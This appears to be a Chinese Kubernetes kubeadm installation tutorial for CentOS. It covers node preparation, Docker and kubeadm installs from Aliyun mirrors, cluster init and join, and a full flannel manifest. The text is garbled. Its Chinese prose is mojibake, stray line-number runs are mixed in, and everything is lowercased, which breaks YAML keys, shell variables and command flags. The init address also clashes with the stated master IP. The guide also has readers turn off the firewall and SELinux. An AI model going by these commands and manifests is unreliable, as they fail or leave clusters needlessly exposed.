<none>        80:31543/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 è¿ä¸ªç«¯å£å°±æ¯å¤é¨ç«¯å£ï¼å¯ä»¥éè¿èç¹åç§° + ç«¯å£å·ç´æ¥è®¿é®æµè¯',normalizedContent:'# 1 åç½®ç¥è¯ç¹\n\nkubernetes éç¾¤å¤§ä½ä¸åä¸ºä¸¤ç±»ï¼ä¸ä¸»å¤ä» å å¤ä¸»å¤ä»ã\n\n * ä¸ä¸»å¤ä»ï¼ä¸å° mater èç¹åå¤å° node èç¹ï¼æ­å»ºç®åï¼ä½æ¯ç±åæºæéé£é©ï¼éåç¨äºæµè¯ç¯å¢\n * å¤ä¸»å¤ä»ï¼å¤å° master èç¹åå¤å° node èç¹ï¼æ­å»ºéº»ç¦ï¼å®å¨æ§é«ï¼éç¨äºçäº§ç¯å¢ã\n\n\n\n\n# 1.2 å®è£æ¹å¼\n\nkubernetes å¤æå¤ç§é¨ç½²æ¹å¼ï¼ç®åä¸»æµçæ¹å¼ç± kubeadmãminikubeãäºè¿å¶å\n\n * minikubeï¼ä¸ä¸ªç¨äºå¿«éæ­å»ºåèç¹ kubernetes çå·¥å·\n * kubeadmï¼ä¸ä¸ªç¨å¿«éæ­å»º kubernetes éç¾¤çå·¥å·\n * äºè¿å¶åï¼ä»å®ç½ä¸è½½æ¯ä¸ªç»ä»¶çäºè¿å¶åï¼ä»¥æ­¤å»å®è£ï¼æ­¤æ¹å¼å¯¹äºçè§£ kubernetes ç»ä»¶æ´å ææ\n\n> æ°ææ¨è kubeadm\n\n\n# 1.3 kubeadm é¨ç½²æ¹å¼ä»ç»\n\nkubeadm æ¯å®æ¹ç¤¾åºæ¨åºçä¸ä¸ªç¨äºå¿«éé¨ç½² kubernetes éç¾¤çå·¥å·ï¼è¿ä¸ªå·¥å·è½éè¿ä¸¤æ¡æä»¤å®æä¸ä¸ª kubernetes éç¾¤çé¨ç½²ï¼\n\n * åå»ºä¸ä¸ª master èç¹ kubeadm init\n * å° node èç¹å å¥å°å½åéç¾¤ä¸­ $ kubeadm join <master èç¹ç ip åç«¯å£>\n\n> kubeadm å®è£éç¾¤è¦æ± centos7.5 åä»¥ä¸\n\n\n# 1.4 å®è£è¦æ±\n\nå¨å¼å§ä¹åï¼é¨ç½² kubernetes éç¾¤æºå¨éè¦æ»¡è¶³ä»¥ä¸å ä¸ªæ¡ä»¶ï¼\n\n * ä¸å°æå¤å°æºå¨ï¼æä½ç³»ç» centos7.x-86_x64\n * ç¡¬ä»¶éç½®ï¼2gb ææ´å¤ ramï¼2 ä¸ª cpu ææ´å¤ cpuï¼ç¡¬ç 30gb ææ´å¤\n * éç¾¤ä¸­æææºå¨ä¹é´ç½ç»äºé\n * å¯ä»¥è®¿é®å¤ç½ï¼éè¦æåéå\n * ç¦æ­¢ swap ååº\n\n\n# 1.5 æç»ç®æ \n\n * å¨ææèç¹ä¸å®è£ docker å kubeadm\n * é¨ç½² kubernetes master\n * é¨ç½²å®¹å¨ç½ç»æä»¶\n * é¨ç½² kubernetes nodeï¼å°èç¹å å¥ kubernetes éç¾¤ä¸­\n * é¨ç½² dashboard web é¡µé¢ï¼å¯è§åæ¥ç kubernetes èµæº\n\n\n# 2 å®è£é¨ç½²\n\n\n\nè§è²       hostname   ip               ç»ä»¶\nmaster   node101    192.168.81.101   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode1    node102    192.168.81.102   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode2    node103    192.168.81.103   dockerï¼kubectlï¼kubeadmï¼kubelet\n\n> ä»¥ä¸æ²¡æç¹å®è¯´æå¨ master è¿æ¯ node ä¸æä½ï¼é»è®¤å¨é¨èç¹éè¦æä½ã\n\n\n# 2.1 hostname åè§£æ\n\nä¸ç®¡æ­å»ºè®¾ä»ä¹éç¾¤ï¼åè®°è®¾ç½®å¥½ hostnameï¼æ¯è¾æ¹ä¾¿ãä¸¤ä¸ªæ­¥éª¤å®æè®¾ç½®ï¼\n\n 1. ä¸´æ¶è®¾ç½®ãhostname èç¹åç§°\n 2. vim /etc/hostname\n\nè®¾ç½®å®æåè¦æ·»å è§£æ hostname ä¸»æºåç ip æ å°ï¼vim /etc/hosts ç´æ¥ä¿®æ¹\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 æ¶é´åæ­¥\n\nkubernetes è¦æ±æ®ç¾¤ä¼çèç¹æ¶é´å¿é¡»ç²¾ç¡®ä¸è´ï¼è¿éç´æ¥ä½¿ç¨ chronyd æå¡ä»ç½ç»åæ­¥æ¶é´ãä¼ä¸ä¸­å»ºè®®éç½®åé¨çæ¶é´åæ­¥æå¡å¨ã\n\n# å¯å¨chronydæå¡\nsystemctl start chronyd\n# è®¾ç½®chronydæå¡å¼æºèªå¯å¨\nsystemctl enable chronyd\n# chronyd æå¡å¯å¨ç¨ç­å ç§éï¼å°±å¯ä»¥ä½¿ç¨dataå½ä»¤éªè¯æ¶é´äº\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 ç¦ç¨ iptables å firewalld æå¡\n\nkubernetes å docker å¨è¿è¡ä¸­ä¼äº§çå¤§éç iptables è§åï¼ä¸ºäºä¸è®©ç³»ç»è§åè·ä»ä»¬æ··æ·ï¼ç´æ¥å³é­ç³»ç»çè§åï¼çäº§ç³»ç»å»ºè®®å¼å¯ï¼éè¦å¼æ¾åªäºç«¯å£æè ipï¼æå¨éç½®ã\n\n# å³é­ firewalld æå¡\nsystemctl stop firewalld\nsystemctl disable firewalld\n# å³é­iptanlesæå¡\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 ç¦ç¨ selinux\n\nselinux æ¯ linux ç³»ç»ä¸çä¸ä¸ªå®å¨æå¡ï¼å¦æä¸å³é­å®ï¼å¨å®è£éç¾¤ä¸­å¯è½ä¼è¢«éå¶\n\n# ä¸´æ¶å³é­\nsetenforce 0\n# æ°¸ä¹ç¦ç¨\nvim /etc/selinux/config\nselinux=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 ç¦ swap ç¨ååº\n\nswap ååºæçæ¯èæåå­ååºï¼å®çä½ç¨æ¯å¨ç©çåå­ä½¿ç¨å®ä¹åï¼å°ç£çç©ºé´èææåå­æ¥ä½¿ç¨ï¼å¯ç¨ swap è®¾å¤ä¼å¯¹ç³»ç»çæ§è½äº§çéå¸¸è´é¢çå½±åï¼å æ­¤ kubernetes è¦æ±æ¯ä¸ªèç¹é½è¦ç¦ç¨ swap è®¾å¤ï¼ä½æ¯å¦æå ä¸ºæäºåå ç¡®å®ä¸è½å³é­ swap ååºï¼å°±éè¦å¨éç¾¤å®è£çè¿ç¨ä¸­éè¿æç¡®çåæ°è¿è¡éç½®è¯´æã\n\n# ä¸´æ¶å³é­\nswapoff -a\n\n# æ°¸ä¹å³é­ï¼ç¼è¾ååºéç½®æä»¶ /etc/fstabï¼æ³¨éæ wap ååºä¸è¡\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 ä¿®æ¹ linxu çåæ ¸åæ°\n\n# ä¿®æ¹linuxçåæ ¸åæ°ï¼æ·»å ç½æ¡¥è¿æ»¤åå°åè½¬ååè½\n# ç¼è¾ /etc/sysctl.d/k8s.conf æä»¶ï¼æ·»å å¦ä¸éç½®ï¼\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# å è½½ç½æ¡¥è¿æ»¤æ¨¡å\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# éç½®å®æåéæ°å è½½éç½®æä»¶\nsysctl -p /etc/sysctl.d/k8s.conf\n# æ¥çç½æ¡¥è¿æ»¤æ¨¡åæ¯å¦æ·»å æå\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 éç½® ipvs\n\nå¨ kubernetes ä¸­ service æä¸¤ç§ä»£çæ¨¡åï¼ä¸ç§æ¯åºäº iptables çï¼ä¸ç§æ¯åºäº ipvs çï¼ä¸¤èæ¯è¾çè¯ï¼ipvs çæ§è½ææ¾æ´è¦é«ä¸äºï¼ä½æ¯å¦æè¦ä½¿ç¨å®ï¼éè¦æå¨è½½å¥ ipvs æ¨¡å\n\n# å®è£ ipset å ipvsadm \nyum install ipset ipvsadm -y\n\n# æ·»å éè¦å è½½å¾æ¨¡ååå¥èæ¬æä»¶\ncat <<eof > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\neof\n\n# ä¸ºèæ¬æä»¶æ·»å æ§è¡æé\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# æ§è¡èæ¬æä»¶\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# æ¥çå¯¹åºå¾æ¨¡åæ¯å¦å è½½æå\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker å®è£\n\n# ä¹åå®è£è¿docker å¸è½½\nyum remove docker-*\n\n# æ´æ¢éåå°å\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -o /etc/yum.repos.d/docker-ce.repo\n\n# æ£æ¥æ¯æçæ¬\nyum list docker-ce --showduplicates | sort -r\n\n# å®è£\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# æ·»å ä¸ä¸ªéç½®æä»¶ï¼dockerå¨é»è®¤æåµä¸ä½¿ç¨çcgroup driverä¸ºcgroupfsï¼èkubernetesæ¨èä½¿ç¨systemdæ¥ä»£æ¿cgroupfs\ncat > /etc/docker/daemon.json <<eof\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\neof\n\n# å¯å¨docker\nsystemctl restart docker\nsystemctl enable docker\n\n#æ£æ¥çæ¬\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 å®è£ kubernetes ç»ä»¶\n\nç±äº kubernetes çéåæºå¨å½å¤ï¼éåº¦æ¯è¾æ¢ï¼è¿éåæ¢æå½åçéåæº\n\n# æ·»å éç½®æä»¶\nvim /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå®è£ kubeadmãkubelet å kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\nè®¾ç½® kubelet å¼æºèªå¯å¨\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 éç¾¤åå§å\n\n# åå¤éå\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imagename in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename k8s.gcr.io/$imagename\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå§å\n\nå¨ master ç¹æä½å¦ä¸\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version ä¸ºçæ¬\n * pod-network-cidr æå® pod ç½ç»\n * service-cidr æå® service ç½ç»\n * apiserver-advertise-address æå® master ç ip å°å\n * image-repository registry.aliyuncs.com/google_containers æå®éåæºä¸ºé¿éï¼åé¢å·²ç»æåè¿éåäºï¼æä»¥ä¸éè¦å¨æ\n\n# å®è£è¿ç¨ä¸­æ¥éå¦ææ¥éï¼æ¥çæ¥å¿\njournalctl -xfeu kubelet\n\n# éç½® kubeadm çä¿¡æ¯\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\nå¨ master ç¹åå»ºå¿è¦çæä»¶ï¼æ¯ kubectl ä»¥åè¦æ§è¡çéç½®æä»¶\n\n  mkdir -p $home/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $home/.kube/config\n  sudo chown $(id -u):$(id -g) $home/.kube/config\n\n\n1\n2\n3\n\n\nå¶ä»å­èç¹æ§è¡ï¼å®è£æååä¼æä¿¡æ¯åè¯ä½ \n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\næ¥çææèç¹\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 å®è£ç½ç»æä»¶\n\nkubernetes æ¯æå¤ç§ç½ç»æä»¶ï¼æ¯å¦ flannelãcalicoãcanal ç­ç­ï¼ä»»éä¸ç§ä½¿ç¨å³å¯ï¼æ¬æ¬¡éæ© flannel\n\n# master æä½\n\nåå»ºæä»¶ï¼å¤å¶æ§åå®¹å°æä»¶ä¸­\n\ncat <<eof > kube-flannel.yml\n---\napiversion: policy/v1beta1\nkind: podsecuritypolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedprofilenames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultprofilename: docker/default\n    apparmor.security.beta.kubernetes.io/allowedprofilenames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultprofilename: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configmap\n    - secret\n    - emptydir\n    - hostpath\n  allowedhostpaths:\n    - pathprefix: "/etc/cni/net.d"\n    - pathprefix: "/etc/kube-flannel"\n    - pathprefix: "/run/flannel"\n  readonlyrootfilesystem: false\n  # users and groups\n  runasuser:\n    rule: runasany\n  supplementalgroups:\n    rule: runasany\n  fsgroup:\n    rule: runasany\n  # privilege escalation\n  allowprivilegeescalation: false\n  defaultallowprivilegeescalation: false\n  # capabilities\n  allowedcapabilities: [\'net_admin\']\n  defaultaddcapabilities: []\n  requireddropcapabilities: []\n  # host namespaces\n  hostpid: false\n  hostipc: false\n  hostnetwork: true\n  hostports:\n  - min: 0\n    max: 65535\n  # selinux\n  selinux:\n    # selinux is unused in caasp\n    rule: \'runasany\'\n---\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apigroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourcenames: [\'psp.flannel.unprivileged\']\n  - apigroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apigroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apigroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleref:\n  apigroup: rbac.authorization.k8s.io\n  kind: clusterrole\n  name: flannel\nsubjects:\n- kind: serviceaccount\n  name: flannel\n  namespace: kube-system\n---\napiversion: v1\nkind: serviceaccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: configmap\napiversion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniversion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinmode": true,\n            "isdefaultgateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portmappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "network": "10.244.0.0/16",\n      "backend": {\n        "type": "vxlan"\n      }\n    }\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - amd64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n            add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - ppc64le\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - s390x\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\neof\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\